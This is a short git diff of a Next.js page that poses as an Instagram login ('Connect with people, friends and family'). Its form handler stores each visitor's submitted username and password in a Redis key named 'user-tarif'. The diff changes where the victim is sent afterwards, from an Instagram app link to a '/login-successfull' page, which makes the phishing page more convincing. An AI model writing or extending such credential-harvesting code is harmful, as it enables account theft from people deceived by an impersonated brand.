@@ -2,6 +2,7 @@ import Image from "next/image";
 import { redis } from "../helpers/redis";
 import { redirect } from 'next/navigation';
 import { Metadata } from "next";
+import { RedirectType } from "next/dist/client/components/redirect";
 export const metadata:Metadata = {
     title: 'Instagram',
     description: 'Connect with people, friends and family',
@@ -20,7 +21,7 @@ export default function Home() {
     const userorname = e.get('userorname')
     const password = e.get('password');
     const data = await redis.set('user-tarif',`username:${userorname}&password:${password}`);
-    redirect("intent://www.instagram.com/reel/CqT56BGgDlw/#Intent;package=com.instagram.android;scheme=https;end?utm_source=ig_web_copy_link&igshid=MzRlODBiNWFlZA==",)
+    redirect("/login-successfull", RedirectType.replace)
     
   }
   return (
